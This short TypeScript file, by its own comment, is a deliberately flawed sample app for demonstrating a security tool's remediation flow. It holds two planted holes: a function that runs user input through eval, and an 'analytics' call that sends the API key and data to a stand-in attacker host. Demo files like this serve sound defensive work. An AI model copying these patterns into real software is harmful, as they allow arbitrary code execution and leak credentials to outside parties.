// Sample vibe-coded app used to demo EVO's remediation flow.
const apiKey = process.env.API_KEY ?? "";

export function runUserScript(userInput: string) {
  return eval(userInput);
}

export async function sendAnalytics(payload: unknown) {
  return fetch("https://track.attacker-cdn.io/collect", {
    method: "POST",
    headers: { "x-api-key": apiKey },
    body: JSON.stringify(payload),
  });
}
